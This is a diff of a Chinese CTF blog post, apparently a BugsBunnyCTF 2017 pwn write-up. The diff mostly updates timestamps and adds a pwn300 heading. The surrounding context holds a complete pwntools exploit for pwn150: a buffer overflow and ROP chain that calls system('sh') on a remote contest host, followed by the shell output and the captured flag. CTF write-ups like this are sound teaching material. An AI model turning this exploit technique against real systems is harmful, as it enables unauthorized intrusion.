@@ -97,7 +97,7 @@
 <meta property="og:description" content="单刷好幸苦。">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/16.jpg?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/17.jpg?raw=true">
-<meta property="og:updated_time" content="2017-07-31T00:01:26.424Z">
+<meta property="og:updated_time" content="2017-08-01T12:52:08.339Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BugsBunnyCTF2017-pwn-writeup">
 <meta name="twitter:description" content="单刷好幸苦。">
@@ -422,7 +422,7 @@
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170729/17.jpg?raw=true" alt=""></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'pwn150'</span>)</div><div class="line">r = remote(<span class="string">"54.153.19.139"</span>,<span class="string">"5253"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"UTC 2017"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"Send me your message here:"</span>)</div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr = elf.search(<span class="string">'sh'</span>).next()</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400883</span></div><div class="line">pop_rsi_pop_r15_ret =  <span class="number">0x0000000000400881</span></div><div class="line">offset = <span class="number">88</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">r.send(payload)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
 <p>最后的flag：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">pwn150</div><div class="line">$ <span class="built_in">cd</span> pwn150</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pwn150</div><div class="line">$ cat flag</div><div class="line">Bugs_Bunny&#123;did_i_help_you_Solve_it!oHH_talk_to_hacker:D&#125;</div></pre></td></tr></table></figure></p>
-
+<h1 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h1>
       
     </div>
 	<div>
@@ -437,7 +437,7 @@
   <p><span>本文标题:</span><a href="/2017/07/30/BugsBunnyCTF2017-pwn-writeup/">BugsBunnyCTF2017-pwn-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2017年07月30日 - 07:07</p>
-  <p><span>最后更新:</span>2017年07月31日 - 08:07</p>
+  <p><span>最后更新:</span>2017年08月01日 - 20:08</p>
   <p><span>原始链接:</span><a href="/2017/07/30/BugsBunnyCTF2017-pwn-writeup/" title="BugsBunnyCTF2017-pwn-writeup">http://yoursite.com/2017/07/30/BugsBunnyCTF2017-pwn-writeup/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/07/30/BugsBunnyCTF2017-pwn-writeup/"  aria-label="复制成功！"></i></span>
   </p>
@@ -593,7 +593,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">70</span>
+                <span class="site-state-item-count">71</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -686,7 +686,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn50"><span class="nav-number">1.</span> <span class="nav-text">Pwn50</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn100"><span class="nav-number">2.</span> <span class="nav-text">Pwn100</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn150"><span class="nav-number">3.</span> <span class="nav-text">pwn150</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn50"><span class="nav-number">1.</span> <span class="nav-text">Pwn50</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn100"><span class="nav-number">2.</span> <span class="nav-text">Pwn100</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn150"><span class="nav-number">3.</span> <span class="nav-text">pwn150</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn300"><span class="nav-number">4.</span> <span class="nav-text">pwn300</span></a></li></ol></div>
             
 
           </div>
